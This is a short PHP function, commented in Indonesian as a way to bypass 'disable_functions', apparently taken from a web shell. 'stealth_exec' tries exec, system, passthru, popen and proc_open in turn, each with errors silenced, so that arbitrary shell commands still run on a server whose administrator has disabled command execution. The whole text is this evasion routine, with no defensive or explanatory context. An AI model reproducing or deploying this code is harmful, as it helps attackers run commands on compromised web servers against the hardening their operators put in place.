// Fungsi stealth_exec untuk bypass disable_functions
function stealth_exec($cmd) {
    $out = '';
    $cmd .= ' 2>&1';
    $disabled = explode(',', ini_get('disable_functions'));
    if (!in_array('exec', $disabled)) { @exec($cmd, $o); $out = implode("\n", $o); }
    elseif (!in_array('system', $disabled)) { ob_start(); @system($cmd); $out = ob_get_clean(); }
    elseif (!in_array('passthru', $disabled)) { ob_start(); @passthru($cmd); $out = ob_get_clean(); }
    elseif (!in_array('popen', $disabled)) { $h = @popen($cmd, 'r'); if ($h) { while (!feof($h)) $out .= fread($h, 1024); pclose($h); } }
    elseif (!in_array('proc_open', $disabled)) { $d = [1=>['pipe','w'], 2=>['pipe','w']]; $p = @proc_open($cmd, $d, $pipes); if (is_resource($p)) { $out = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]); fclose($pipes[1]); fclose($pipes[2]); proc_close($p); } }
    else $out = 'Semua fungsi exec nonaktif.';
    return $out;
}

